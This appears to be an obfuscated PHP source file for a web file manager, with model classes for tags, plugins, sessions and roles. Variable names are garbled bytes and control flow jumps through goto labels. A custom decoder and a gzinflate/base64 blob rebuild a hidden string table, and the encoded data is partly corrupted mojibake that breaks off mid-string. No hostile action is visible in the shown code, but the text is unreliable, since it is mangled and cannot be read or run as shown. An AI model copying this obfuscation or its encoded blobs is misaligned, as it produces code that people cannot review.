getByTagID($Õ¹õ½·ï, $ÃÑ˜óó) { $İš†»ß› =& $_SERVER[ Ö‘ñÄ”]; if (!$Õ¹õ½·ï || !$ÃÑ˜óó) { return !1; } if (!Model($İš†»ß›[530])->getInfoSimple($Õ¹õ½·ï)) { return !1; } $†Õ†Æå = $this->get($Õ¹õ½·ï); if (!$†Õ†Æå || !isset($†Õ†Æå[$İš†»ß›[378]])) { return !1; } $è˜ƒ›ÄÒ = array_find_by_field($†Õ†Æå[$İš†»ß›[378]], $İš†»ß›[407], $ÃÑ˜óó); return is_array($è˜ƒ›ÄÒ) ? $è˜ƒ›ÄÒ : !1; } public function listSource($¯›Š‹šÔ, $³ó‹œÔƒ) { $¿Œåòúœ =& $_SERVER[ Ö‘ñÄ”]; if ($³ó‹œÔƒ && !is_array($³ó‹œÔƒ)) { $³ó‹œÔƒ = array($³ó‹œÔƒ); } $ãâËÚ©¼ = $this->listData($¯›Š‹šÔ); $…Ğ¿ÊõÜ = array(); foreach ($ãâËÚ©¼ as $øÓ²†½) { $¡›‚•ô = $øÓ²†½[$¿Œåòúœ[84]]; if (!$¡›‚•ô) { continue; } if (!isset($…Ğ¿ÊõÜ[$¡›‚•ô])) { $…Ğ¿ÊõÜ[$¡›‚•ô] = array(); } $…Ğ¿ÊõÜ[$¡›‚•ô][] = $øÓ²†½[$¿Œåòúœ[434]]; } $Ö³øƒ’® = array(); foreach ($…Ğ¿ÊõÜ as $ùä¢Ğ‰ => $Üªø÷¢ó) { $İ’×ûşÅ = !0; if (!$³ó‹œÔƒ) { $Ö³øƒ’®[] = $ùä¢Ğ‰; continue; } foreach ($³ó‹œÔƒ as $´Ä«Ä‹Ã) { if (!in_array($´Ä«Ä‹Ã, $Üªø÷¢ó)) { $İ’×ûşÅ = !1; break; } } if ($İ’×ûşÅ) { $Ö³øƒ’®[] = $ùä¢Ğ‰; } } if (!$Ö³øƒ’®) { return array(); } $×–ºèó§ = array($¿Œåòúœ[425] => array($¿Œåòúœ[426], $Ö³øƒ’®), $¿Œåòúœ[513] => $¯›Š‹šÔ, $¿Œåòúœ[419] => SourceModel::TYPE_GROUP); $Ü÷Ïêæ– = Model($¿Œåòúœ[1333])->listSource($×–ºèó§); if (!$Ü÷Ïêæ– || count($Ö³øƒ’®) == $Ü÷Ïêæ–[$¿Œåòúœ[375]][$¿Œåòúœ[376]]) { return $Ü÷Ïêæ–; } $¢š©×±’ = array(); $øøÀ´¾µ = array_to_keyvalue($Ü÷Ïêæ–[$¿Œåòúœ[82]], $¿Œåòúœ[12], $¿Œåòúœ[410]); $ñ²È¼–° = array_to_keyvalue($Ü÷Ïêæ–[$¿Œåòúœ[83]], $¿Œåòúœ[12], $¿Œåòúœ[410]); $˜ÔÏ‘Â„ = array_merge($ñ²È¼–°, $øøÀ´¾µ); foreach ($Ö³øƒ’® as $¡›‚•ô) { if (!in_array($¡›‚•ô, $˜ÔÏ‘Â„)) { $¢š©×±’[] = $¡›‚•ô; } } if ($¢š©×±’) { $this->removeBySource($¯›Š‹šÔ, $¢š©×±’); } return $Ü÷Ïêæ–; } protected function listData($³·éšªò) { $ŒÅÛ¶® =& $_SERVER[ Ö‘ñÄ”]; $Ä¯Š«Ãø = array($ŒÅÛ¶®[1654] => 0, $ŒÅÛ¶®[492] => array($ŒÅÛ¶®[1951], 0), $ŒÅÛ¶®[430] => $ŒÅÛ¶®[1952] . $³·éšªò); $îÔõıË¾ = $ŒÅÛ¶®[1953]; $ª¬šÈÚ† = $this->field($îÔõıË¾)->where($Ä¯Š«Ãø)->order($ŒÅÛ¶®[1954])->select(); return $ª¬šÈÚ† ? $ª¬šÈÚ† : array(); } protected function addToTag($¡„½¦ª, $–¯Ñîåò, $‡¦Êóïä) { $ºİ‹Ë¯Ü =& $_SERVER[ Ö‘ñÄ”]; if (!$this->getByTagID($¡„½¦ª, $‡¦Êóïä) || !$–¯Ñîåò) { return !1; } if (!Model($ºİ‹Ë¯Ü[838])->pathInfo($–¯Ñîåò)) { return !1; } $à´’½ å = array($ºİ‹Ë¯Ü[1654] => 0, $ºİ‹Ë¯Ü[492] => $‡¦Êóïä, $ºİ‹Ë¯Ü[429] => $–¯Ñîåò, $ºİ‹Ë¯Ü[430] => $ºİ‹Ë¯Ü[1955] . $¡„½¦ª, $ºİ‹Ë¯Ü[428] => $ºİ‹Ë¯Ü[12], $ºİ‹Ë¯Ü[1840] => 0); if ($this->where($à´’½ å)->find()) { return !1; } return $this->add($à´’½ å); } protected function removeFromTag($ˆ—”Ùó, $¹½ƒß³Ú, $Ìè™ë×“) { $ö€»úíî =& $_SERVER[ Ö‘ñÄ”]; if (!$this->getByTagID($ˆ—”Ùó, $Ìè™ë×“) || !$¹½ƒß³Ú) { return !1; } if (is_array($¹½ƒß³Ú)) { $¹½ƒß³Ú = array($ö€»úíî[7], $¹½ƒß³Ú); } $­­‹Œæ£ = array($ö€»úíî[1654] => 0, $ö€»úíî[492] => $Ìè™ë×“, $ö€»úíî[430] => $ö€»úíî[1955] . $ˆ—”Ùó, $ö€»úíî[429] => $¹½ƒß³Ú); return $this->where($­­‹Œæ£)->delete(); } protected function removeByTag($˜¦Ï¯’¹, $ŸÀ†òóö) { $±ñšÛóö =& $_SERVER[ Ö‘ñÄ”]; if (!$this->getByTagID($˜¦Ï¯’¹, $ŸÀ†òóö)) { return !1; } $èì˜Åë§ = array($±ñšÛóö[1654] => 0, $±ñšÛóö[492] => $ŸÀ†òóö, $±ñšÛóö[430] => $±ñšÛóö[1955] . $˜¦Ï¯’¹); return $this->where($èì˜Åë§)->delete(); } protected function removeBySource($Ò¡ÖØşÖ, $«Ã¼¦Ø) { $ÙíØæ¾õ =& $_SERVER[ Ö‘ñÄ”]; if (!$Ò¡ÖØşÖ || !$«Ã¼¦Ø) { return !1; } if (is_array($«Ã¼¦Ø)) { $«Ã¼¦Ø = array($ÙíØæ¾õ[7], $«Ã¼¦Ø); } $éüüƒ™ø = array($ÙíØæ¾õ[1654] => 0, $ÙíØæ¾õ[429] => $«Ã¼¦Ø, $ÙíØæ¾õ[492] => array($ÙíØæ¾õ[1020], 0), $ÙíØæ¾õ[430] => $ÙíØæ¾õ[1955] . $Ò¡ÖØşÖ); return $this->where($éüüƒ™ø)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\160\154\x75\x67\x69\x6e\x4c\151\x73\164"; public $field = array("\156\141\155\x65", "\163\x74\141\164\165\163", "\x72\145\147\151\145\163\164", "\143\157\x6e\x66\x69\x67"); public function loadList($…Õªãó = false) { $×à“ª¦± = array_to_keyvalue($this->listData(), $_SERVER[ Ö‘ñÄ”][32]); if ($…Õªãó) { return $×à“ª¦±[$…Õªãó]; } return $×à“ª¦±; } public function init() { $œƒî¥­² =& $_SERVER[ Ö‘ñÄ”]; Hook::trigger($œƒî¥­²[1956]); $€‚–ãÃŞ = $this->loadPluginList(); foreach ($€‚–ãÃŞ as $¥¡ŠáÄš => $¤ºşú³) { $æ§úëü = $this->appAllow($¥¡ŠáÄš, $¤ºşú³); if (!$æ§úëü) { continue; } foreach ($¤ºşú³[$œƒî¥­²[1957]] as $ªçÉ±‘Õ => $Åá•â¶¼) { Hook::bind($ªçÉ±‘Õ, $Åá•â¶¼); } } Hook::trigger($œƒî¥­²[1958]); Hook::trigger(ACTION); } public function appAllow($Á§Š¯ì, $ÀÑ—Àˆ¾, $ëÁôñì¿ = true) { $éü¡ºİ =& $_SERVER[ Ö‘ñÄ”]; $­ë¾µì› = PLUGIN_DIR . $Á§Š¯ì . $éü¡ºİ[1959]; if (!is_array($ÀÑ—Àˆ¾) || !is_array($ÀÑ—Àˆ¾[$éü¡ºİ[1957]]) || $ÀÑ—Àˆ¾[$éü¡ºİ[763]] != 1 || !is_file($­ë¾µì›)) { return !1; } if ($GLOBALS[$éü¡ºİ[511]] == 1) { if ($GLOBALS[$éü¡ºİ[6]][$éü¡ºİ[1960]] || !$GLOBALS[$éü¡ºİ[6]][$éü¡ºİ[1961]]) { return !0; } $¢ÃªãïŒ = explode($éü¡ºİ[50], strtolower($GLOBALS[$éü¡ºİ[6]][$éü¡ºİ[1961]])); return in_array(strtolower($Á§Š¯ì), $¢ÃªãïŒ) ? !1 : !0; } if ($ëÁôñì¿ && !Action($éü¡ºİ[1962])->checkAuth($Á§Š¯ì)) { return !1; } return !0; } public function unInstall($‡ÄÍÙ²Ï) { $ã«¬€ =& $_SERVER[ Ö‘ñÄ”]; $á©İÆ§Ô = $this->loadList($‡ÄÍÙ²Ï); if (file_exists(PLUGIN_DIR . $‡ÄÍÙ²Ï)) { Hook::apply($‡ÄÍÙ²Ï . $ã«¬€[1963]); } $this->remove($á©İÆ§Ô[$ã«¬€[407]]); } public function changeStatus($¾«²¨‡«, $ıòâ¤òÎ) { $¦¾ëÎã =& $_SERVER[ Ö‘ñÄ”]; $Î¡«õ¯ù = $this->loadList($¾«²¨‡«); if ($ıòâ¤òÎ) { Hook::apply($¾«²¨‡« . $¦¾ëÎã[1964]); } $this->update($Î¡«õ¯ù[$¦¾ëÎã[407]], array($¦¾ëÎã[1965] => $ıòâ¤òÎ)); } public function appRegist($™ü¢Ã‡…, $«‡¼ÒÈ½) { $¯¥øâÏì =& $_SERVER[ Ö‘ñÄ”]; $£øé‡Ó¡ = $this->loadList($™ü¢Ã‡…); if ($£øé‡Ó¡) { $this->update($£øé‡Ó¡[$¯¥øâÏì[407]], array($¯¥øâÏì[1957] => $«‡¼ÒÈ½)); } else { $µäÂ›‹¾ = array($¯¥øâÏì[32] => $™ü¢Ã‡…, $¯¥øâÏì[1957] => $«‡¼ÒÈ½, $¯¥øâÏì[763] => 0, $¯¥øâÏì[6] => $this->getConfigDefault($™ü¢Ã‡…)); $this->insert($µäÂ›‹¾); } } public function getConfigDefault($¹ó¾™àè) { $âˆş¿› =& $_SERVER[ Ö‘ñÄ”]; $Çß›„« = array(); $·®ÄÇ Ü = $this->getPackageJson($¹ó¾™àè); if (!$·®ÄÇ Ü && is_array($·®ÄÇ Ü[$âˆş¿›[1966]])) { return $Çß›„«; } foreach ($·®ÄÇ Ü[$âˆş¿›[1966]] as $ş¾õ£÷÷ => $ıÙñûøş) { if (!isset($ıÙñûøş[$âˆş¿›[383]]) || isset($Çß›„«[$ş¾õ£÷÷])) { continue; } $Çß›„«[$ş¾õ£÷÷] = $ıÙñûøş[$âˆş¿›[383]]; } return $Çß›„«; } public function getPackageJson($‚ï®¹ç) { return Hook::apply($‚ï®¹ç . $_SERVER[ Ö‘ñÄ”][1967]); } public function getConfig($€œ‚ÂÒ, $°¹›·§â = false) { $åÁ¹ÓŠŠ =& $_SERVER[ Ö‘ñÄ”]; $¤£ Îä = array(); $ç¿Ü·“ä = $this->loadList($€œ‚ÂÒ); if ($ç¿Ü·“ä && is_array($ç¿Ü·“ä[$åÁ¹ÓŠŠ[6]])) { $¤£ Îä = $ç¿Ü·“ä[$åÁ¹ÓŠŠ[6]]; } if (!$¤£ Îä || $°¹›·§â) { $¤£ Îä = $this->getConfigDefault($€œ‚ÂÒ); } return $¤£ Îä; } public function setConfig($±“äÁ·è, $ø†¤º = false) { $•¯Ä”ŞÇ =& $_SERVER[ Ö‘ñÄ”]; $Ú¤Ÿ¯×Ê = $this->loadList($±“äÁ·è); if (!$Ú¤Ÿ¯×Ê) { return !1; } $Ì™»ƒÖ¼ = $Ú¤Ÿ¯×Ê[$•¯Ä”ŞÇ[6]]; if ($ø†¤º == !1) { $Ì™»ƒÖ¼ = array(); $ø†¤º = $this->getConfigDefault($±“äÁ·è); } foreach ($ø†¤º as $‰Ä‚¼–ï => $ª—±€¶) { $Ì™»ƒÖ¼[$‰Ä‚¼–ï] = is_string($ª—±€¶) ? trim($ª—±€¶) : $ª—±€¶; } $this->update($Ú¤Ÿ¯×Ê[$•¯Ä”ŞÇ[407]], array($•¯Ä”ŞÇ[6] => $Ì™»ƒÖ¼)); } public function viewList() { $½£¬ğÊÄ =& $_SERVER[ Ö‘ñÄ”]; $ßı˜â¾ = $this->loadList(); $this->pluginScan($ßı˜â¾); $ßı˜â¾ = $this->loadPluginList(); $¿öäÖÑŸ = array(); foreach ($ßı˜â¾ as $ö·¯°Èí => $å¸Áò¬”) { unset($å¸Áò¬”[$½£¬ğÊÄ[1957]], $å¸Áò¬”[$½£¬ğÊÄ[6]]); $åÔŠ‘ = PLUGIN_DIR . $å¸Áò¬”[$½£¬ğÊÄ[32]] . $½£¬ğÊÄ[1959]; if (!is_file($åÔŠ‘)) { continue; } $›Úæ€Œ– = Hook::apply($å¸Áò¬”[$½£¬ğÊÄ[32]] . $½£¬ğÊÄ[1967]); if (is_array($›Úæ€Œ–)) { $¿öäÖÑŸ[$ö·¯°Èí] = array_merge($å¸Áò¬”, $›Úæ€Œ–); } } return $¿öäÖÑŸ; } private function loadPluginList() { $½Šğ˜›İ =& $_SERVER[ Ö‘ñÄ”]; $ĞÛ½ÚŞ = $this->loadList(); if (strtolower(MOD) == $½Šğ˜›İ[1968]) { return $ĞÛ½ÚŞ; } $ıÕä€“ğ = Hook::trigger($½Šğ˜›İ[1969], $ĞÛ½ÚŞ); if ($ĞÛ½ÚŞ && !$ıÕä€“ğ) { die; } return $ıÕä€“ğ ? $ıÕä€“ğ : $ĞÛ½ÚŞ; } private function pluginScan($áÔÀÚ¼ç) { $İíºáìÕ =& $_SERVER[ Ö‘ñÄ”]; recursion_dir(PLUGIN_DIR, $Öş­÷Íè, $ùêùßìØ, 0); foreach ($Öş­÷Íè as $Š£òßğÃ) { $¬òïµ…ï = get_path_this($Š£òßğÃ); if (isset($áÔÀÚ¼ç[$¬òïµ…ï]) || !file_exists($Š£òßğÃ . $İíºáìÕ[1970]) || !file_exists($Š£òßğÃ . $İíºáìÕ[1959])) { continue; } Hook::apply($¬òïµ…ï . $İíºáìÕ[1964]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\163\145\163\x73\151\x6f\156"; public function get($ğ ›±ÓÁ) { $Ç¬¥”â¾ =& $_SERVER[ Ö‘ñÄ”]; $µÕêü…ğ = $this->where(array($Ç¬¥”â¾[1971] => $ğ ›±ÓÁ))->find(); if (!is_array($µÕêü…ğ)) { return !1; } return $µÕêü…ğ[$Ç¬¥”â¾[768]]; } public function set($áôÊèº, $¥“ƒšØû, $ç¯—ÜÌô = 3600) { $ÊÌ…ú³î =& $_SERVER[ Ö‘ñÄ”]; $ºˆæáŠ… = array($ÊÌ…ú³î[1971] => $áôÊèº, $ÊÌ…ú³î[1875] => $¥“ƒšØû, $ÊÌ…ú³î[1972] => $ç¯—ÜÌô + time()); if (Session::get($ÊÌ…ú³î[1973])) { $ºˆæáŠ…[$ÊÌ…ú³î[1663]] = Session::get($ÊÌ…ú³î[1973]); } else { $ºˆæáŠ…[$ÊÌ…ú³î[1663]] = 0; } if ($this->get($áôÊèº)) { return $this->where(array($ÊÌ…ú³î[1971] => $áôÊèº))->save($ºˆæáŠ…); } else { return $this->add($ºˆæáŠ…, array(), !0); } } public function remove($½¾éüÔ½) { return $this->where(array($_SERVER[ Ö‘ñÄ”][1971] => $½¾éüÔ½))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ Ö‘ñÄ”][1974] . time())->delete(); } } goto A¹Ú¿¼°; d‚ØÆ‡ ¹¹: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\155\137\157\160\164\151\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\157\154\145", "\162\157\x6c\145\107\162\x6f\x75\160", "\x72\x65\147\x69\163\164", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($’ûĞº¨§) { return "\x53\x79\x73\164\145\x6d\117\160\x74\151\157\156\137{$’ûĞº¨§}"; } protected function optionDefault($÷éÒ“Ïë = '') { $Í‰é”õ =& $_SERVER[ Ö‘ñÄ”]; if ($÷éÒ“Ïë == $Í‰é”õ[12]) { return $GLOBALS[$Í‰é”õ[6]][$Í‰é”õ[389]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x72\157\154\145\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x61\165\164\150", "\154\x61\142\145\x6c", "\144\x69\163\160\154\141\x79", "\x73\x79\x73\x74\145\x6d", "\144\x65\163\143", "\151\147\156\157\162\x65\105\x78\x74", "\x69\147\x6e\x6f\x72\x65\106\x69\154\145\123\151\x7a\x65", "\141\x64\155\x69\x6e\151\x73\164\x72\141\164\x6f\162", "\163\157\162\x74"); public function listData($ì‡ñ¯™£ = false, $Ç¿êÕ“ = "\x73\x6f\162\x74", $°¶±Æ÷ = false) { $Îéåáşˆ =& $_SERVER[ Ö‘ñÄ”]; $½È”‚”Å = parent::listData($ì‡ñ¯™£, $Ç¿êÕ“, $°¶±Æ÷); if (!$ì‡ñ¯™£) { foreach ($½È”‚”Å as $ôÒÉ®óà => $ü´­ÎÙÄ) { if ($ü´­ÎÙÄ[$Îéåáşˆ[2034]] == 1) { $½È”‚”Å[$ôÒÉ®óà][$Îéåáşˆ[461]] = LNG($Îéåáşˆ[2268]); } } } return $½È”‚”Å; } public function update($Í×Ãˆïß, $ìå×“¯÷) { $øŒ˜©ğ =& $_SERVER[ Ö‘ñÄ”]; $õüêÜ½ñ = parent::listData($Í×Ãˆïß); $‰·õãäê = $this->findByName($ìå×“¯÷[$øŒ˜©ğ[32]]); if (!$õüêÜ½ñ || $‰·õãäê && $‰·õãäê[$øŒ˜©ğ[407]] != $õüêÜ½ñ[$øŒ˜©ğ[407]]) { return !1; } if ($‰·õãäê[$øŒ˜©ğ[2034]] == 1) { $ìå×“¯÷ = array($øŒ˜©ğ[32] => $ìå×“¯÷[$øŒ˜©ğ[32]], $øŒ˜©ğ[1859] => $ìå×“¯÷[$øŒ˜©ğ[1859]]); } $this->filterAuth($ìå×“¯÷[$øŒ˜©ğ[421]]); return parent::update($Í×Ãˆïß, $ìå×“¯÷); } public function remove($Û÷ÊÆ¹Í) { $Óç¿Èœû = parent::listData($Û÷ÊÆ¹Í); if (!$Óç¿Èœû || $Óç¿Èœû[$_SERVER[ Ö‘ñÄ”][1282]]) { return !1; } return parent::remove($Û÷ÊÆ¹Í); } public function add($¿“Ùèşô) { $¼–µ‘õÎ =& $_SERVER[ Ö‘ñÄ”]; $›‚—¨ùÈ = $¿“Ùèşô[$¼–µ‘õÎ[32]]; if ($this->findByName($›‚—¨ùÈ)) { return !1; } $Îä‰µËÆ = array($¼–µ‘õÎ[428] => $›‚—¨ùÈ, $¼–µ‘õÎ[1842] => $¼–µ‘õÎ[12], $¼–µ‘õÎ[1838] => $¼–µ‘õÎ[1846], $¼–µ‘õÎ[2269] => 1, $¼–µ‘õÎ[1841] => 0, $¼–µ‘õÎ[2270] => 0, $¼–µ‘õÎ[1840] => $this->getSort()); $¿“Ùèşô = array_merge($Îä‰µËÆ, $¿“Ùèşô); $this->filterAuth($¿“Ùèşô[$¼–µ‘õÎ[421]]); return parent::insert($¿“Ùèşô); } private function getSort() { $ß›²ŠÍ‹ =& $_SERVER[ Ö‘ñÄ”]; $íú«Äª = parent::listData(); $Ç»ğ€­Ã = array_to_keyvalue($íú«Äª, $ß›²ŠÍ‹[12], $ß›²ŠÍ‹[1860]); return empty($Ç»ğ€­Ã) ? 0 : max($Ç»ğ€­Ã) + 1; } private function filterAuth(&$üóº…À) { $€Ùì¹ =& $_SERVER[ Ö‘ñÄ”]; $°Ëôö€ = array(); $¡üë„§± = array_filter(explode($€Ùì¹[50], $üóº…À)); foreach ($¡üë„§± as $üóº…À) { $Á×ª¹½¤ = explode($€Ùì¹[10], $üóº…À); if ($Á×ª¹½¤[0] == $€Ùì¹[2271] && $Á×ª¹½¤[1] != $€Ùì¹[1201]) { $ù„¯°İ = $Á×ª¹½¤[0] . $€Ùì¹[10] . $Á×ª¹½¤[1] . $€Ùì¹[2272]; if (!in_array($ù„¯°İ, $¡üë„§±)) { $°Ëôö€[] = $ù„¯°İ; } } $°Ëôö€[] = $üóº…À; } $üóº…À = implode($€Ùì¹[50], $°Ëôö€); } public function findRoleDefault() { $¹†ûª‰¸ =& $_SERVER[ Ö‘ñÄ”]; $ôÚ¥”˜ = parent::listData(); $Ù–î¡§ = !1; foreach ($ôÚ¥”˜ as $àöáÛãö) { if (!$àöáÛãö || $àöáÛãö[$¹†ûª‰¸[1858]] == $¹†ûª‰¸[197] || $àöáÛãö[$¹†ûª‰¸[2034]] == 1) { continue; } if (strstr($àöáÛãö[$¹†ûª‰¸[421]], $¹†ûª‰¸[2273])) { continue; } if (!strstr($àöáÛãö[$¹†ûª‰¸[421]], $¹†ûª‰¸[2274])) { continue; } if (!$Ù–î¡§) { $Ù–î¡§ = $àöáÛãö; continue; } $ÒÑ„õË§ = explode($¹†ûª‰¸[50], $Ù–î¡§[$¹†ûª‰¸[421]]); $ÎãßÓ’¬ = explode($¹†ûª‰¸[50], $àöáÛãö[$¹†ûª‰¸[421]]); if (count($ÒÑ„õË§) > count($ÎãßÓ’¬)) { $Ù–î¡§ = $àöáÛãö; } } return $Ù–î¡§ ? $Ù–î¡§[$¹†ûª‰¸[407]] : $¹†ûª‰¸[12]; } public function sort($«½¢øÅ‹, $¼‡ù»´¦) { return parent::update($«½¢øÅ‹, $¼‡ù»´¦); } } goto fª¾©í¶Ó©; A–ÒÉëË©õ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xa0\xd6\x91\xf1\xc4\x94", base64_decode('q+Sp79ye')); $_SERVER[ Ö‘ñÄ”] = explode(base64_decode('fAF8AnwB'), gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9B5wbxfU4DsQJJYEQMOmQ5cBcscrduZ99tnV3ujthnXRIOhfu')."\x2e\xeb\x95\xb4\x3a\xad\x4f\xd2\xca\xbb\xab\x2b\x2e\x94\xd0\x8b\xe9\x1d\x92\x40\xe8\xcd\x84\x5e\x8d\x9\x81\x10\x5a\x2\x24\x10\x4a\x48\xbe\x14\x9b\x1e\x20\x84\xd0\x12\xf8\x4d\x79\x53\x76\xa5".strrev('Úwôa /§şé8?«Ça´ì7†ıy½§_ş9îo7›Şóy¼§e7™­ƒ?>}ÿóÿïƒ').base64_decode('hq/T8E9O2mUH8mfvk05saOidu9vM2LdOveV67Rrtam1TPProY5Hd/3DdweHtlz46').base64_decode('uX3HHR76ZV2xDWWmZdvoj1IyHUWfMGzHpoCMWcoZIzRslOhvkP4MJKKWXjQdnUYD')."\xf4\x47\x85\x76\x91\x7f\xed\xb5\x5\x83\xa5\xab\xb1\x78\x4a\x4d\xe\xf4\xf7\x87\x13\x29\xc8\xd4\x26\xa7\x17\xcd\x2c\x84\xca\x9a\xa5\x15\xe1\xfb\x65\xdd\xb2\x51\x6b\xe4\xea\xd4\xb2\x59\xd6\x4b"."\x2e\x88\x0\x64\x35\x47\x4b\x6b\x36\xd4\xd4\xd5\xa1\x76\x85\xfb\xa3\xf1\x55\x6a\x6a\x55\x7f\x18\x72\xa4\xd5\xb5\x15\xdd\x9a\xa4\x31\x12\x4c\x3a\x9a\xe5\xa4\x8c\xa2\xce\x73\x8c\x5b\xbc\x5d\x1d"."\xe1\x9e\x48\x4c\x49\x25\x42\xb1\x64\xa8\x33\x15\x89\xc7\x28\xb8\x33\xde\xd7\x17\x49\x55\xc3\x13\xf1\x68\xb4\x23\xd4\xb9\xac\x3a\xa5\x3f\x11\xea\xe9\xb\x29\xa8\x7d\x5\x5d\x35\x4a\x39\xb3\x41".strrev('cQF[)—VŒ•iÏVPñ‰'."\n".'U*i¡¡²gÖ4–'."\r".',…èmĞ4+VSMY')."\136\246\117\162\50\15\150\25\307\64\112\31\32\11\117\70\226\46\340\250\255\31\64\321\172\11\252\112\206\243\341\316\224\202\33\250\164\47\342\175\12\114\102\121\263\35\335\122"."\126\364\206\23\141\5\67\272\275\236\364\265\136\1\174\211\241\241\120\102\321\250\62\125\15\216\136\54\263\152\150\231\32\225\305\23\135\341\204\322\261\112\21\43\224\61\213\105"."\xb3\x14\x40\xb5\xa0\x99\x74\xa4\xa6\x86\x13\x9\x1a\xf0\x1\x7a\x47\x23\x78\xd2\x20\x12\xef\xee\x4e\x86\x79\xc\x3a\x77\x48\x14\xb5\x64\x16\xe0\xa7\x2b\x96\xcd\x15\x1c\x75\x4c\x2b\x54\x18\x9a"."\216\322\337\172\370\201\137\323\6\324\135\153\224\214\12\240\51\124\141\232\174\131\101\240\302\162\353\14\242\147\41\120\104\345\115\130\171\150\31\216\321\140\373\142\372\273\20\62"."\xa5\x55\x9c\xa6\x5b\x8e\xaa\x97\x32\x66\xd6\x28\xc1\x62\x5d\x2\x48\xa7\x39\xf9\x2e\xcb\x40\x19\x68\x3c\x67\x16\xb2\x2c\x6c\x1b\xeb\xa0\x2b\x39\xa3\xa0\xc7\x2a\x45\x39\xb\x8f\x66\xf2\x46\x21"."\153\261\365\365\145\71\151\64\312\227\53\316\53\142\145\324\22\276\322\215\334\244\130\157\266\131\261\62\172\4\255\10\121\256\237\347\156\201\114\272\343\240\316\301\330\30\346\100"."\xb9\x60\x6a\xd9\xa4\x6e\xf1\xae\x19\x66\x37\x2a\x18\xaf\x38\x32\xb0\x42\xb2\x75\x9b\x56\xb1\xb\x51\x6\xf8\x3e\x5a\x15\xc6\x40\x8d\x84\x51\xb6\x2e\xb2\xd2\x88\x5\x1b\x6\x8f\xf4\x7f\x3e\x3c".base64_decode('uBT90wikbwjalNcLBVWf0GHhFLNzbDYYQTttlIIIQqORuJrX7Hxfdo5KSjGKmtUn')."\2\345\174\31\126\65\137\310\103\56\304\306\103\27\63\235\260\104\227\13\146\106\53\310\135\244\341\274\343\224\223\172\51\213\107\2\272\142\216\227\310\110\225\165\35\62\165\371"."\224\254\322\247\254\122\172\333\214\66\233\25\54\26\170\210\365\216\303\154\16\164\46\330\164\146\163\64\220\146\333\102\35\174\320\260\11\205\23\313\123\53\227\13\106\106\163\14"."\263\24\64\63\216\356\370\155\307\322\65\250\61\224\311\350\266\355\357\64\113\216\145\26\374\241\102\301\34\367\307\55\143\304\50\265\51\115\100\154\121\42\132\324\176\114\0\333".base64_decode('YKXWLVQwouDPNLVXnJx/PluBPLelleycbvnDsDLaFNRYTgVZti7DLpu2gZvXpmiO').base64_decode('o2XymIKI6tu/JL9RKhglvSpveKJsWLrN2qr09KWgElS77u+3tJGi1qaUK2k0MrBS').base64_decode('a8BobhiaNiWDoz6lWLEdv6UjUmSg7Q4GOZLz9+F1ZehZfxJRbADPap6tINRRWBqF')."\xf6\xa6\x52\xfd\x6a\xa4\x1b\x6d\xc9\xb1\xb0\xda\x17\x4a\x75\xf6\x42\xb3\x1d\x6d\x84\xb5\x39\x8a\xe8\x30\xaf\x92\x1\x57\xfa\xd1\xfa\xc2\xc8\x15\x43\x7d\x15\xc0\x7e\x73\x5c\xb7\xd0\x87\x3b\x26".base64_decode('25RRM5s2JwIsCWdOIkLDMuPpLjv+hFYaweOTnnR0QEF7bMQ90FG9NOLkWcFkOLE8').strrev('¤h´°Áx©b¹àqx<±¨ñ•§+3èh³ĞŸÁu\\)ö	’Âó6PŠÔîñ“Pœ')."\114\227\337\106\231\374\162\56\126\167\324\50\32\270\355\16\117\41\43\211\166\372\36\150\120\220\164\250\175\50\337\324\60\224\235\331\350\107\377\66\65\16\16\165\5\232\206\227"."\x4\xd\x51\x26\xd8\x12\x68\x51\x5a\x9b\xe7\x2a\xfd\x88\xf5\x30\xb4\x82\x2\x9d\xae\xca\xd1\xac\xc4\x97\xb9\x87\x45\x60\x73\xc9\x2c\xe9\x5f\x32\x38\x78\xef\x92\x96\xbd\x67\x58\x29\x30\x11\x3e".base64_decode('ZCCcTKl94VRvvAu+Hg5BKGrSZct6O0h/hmF2h+mPatjd0raCo5z8qGZ6DZqMPp3R')."\xd8\x1c\xa5\xd1\x91\xa2\x36\xe2\x21\xf9\x38\xd6\x67\x5a\xba\x1b\x22\xb6\xaa\x15\x46\x96\xed\x9\x38\xda\xab\x1b\x23\x79\x18\x2f\x3\xd7\x96\x31\xb\xa6\xa5\x15\x30\x65\x64\x8b\x42\x67\xd4\x6a"."\304\0\152\5\104\130\104\222\106\261\314\32\353\344\53\305\264\24\4\152\157\43\374\141\264\54\157\362\375\314\264\40\324\26\204\214\63\132\273\31\265\17\46\147\241\377\5\151"."\xcf\x9a\x45\x8d\x11\x4a\x42\xe2\xf4\x2c\xa5\x71\x14\xd4\xe4\x4a\xe9\xd5\x35\xb1\x49\x3b\x96\x63\x62\xa8\xe5\xca\x82\x6\x34\x6f\xc2\xc4\x8e\xe8\xac\x49\x15\xde\x36\xd6\xca\xac\x5e\xd0\xd9\x68".base64_decode('5HW2TTRDNrTN8bHK8TlD3B6Civ3ZsBOoJCbqLL4Cs8cC4PCsBbRDxcmMi3i/pecM').base64_decode('WKQlNCN9mjXKeoNmQOAKjkh41D0Qjaqd8VgKsdQUsiIRSYUZ3oa61FBnP994xYxC')."\6\114\140\252\167\17\12\31\153\205\206\243\346\4\305\66\207\50\166\331\54\331\272\77\3\45\4\353\135\225\224\25\273\0\320\31\261\163\170\66\203\11\277\126\134\347\57\242"."\x25\xe0\xe7\xd\x75\xef\xc1\x4a\x4a\xde\xca\x23\x30\x4b\x82\xb8\xe3\x61\x44\x52\x11\xdb\xfc\xfb\xe3\x49\x28\xb0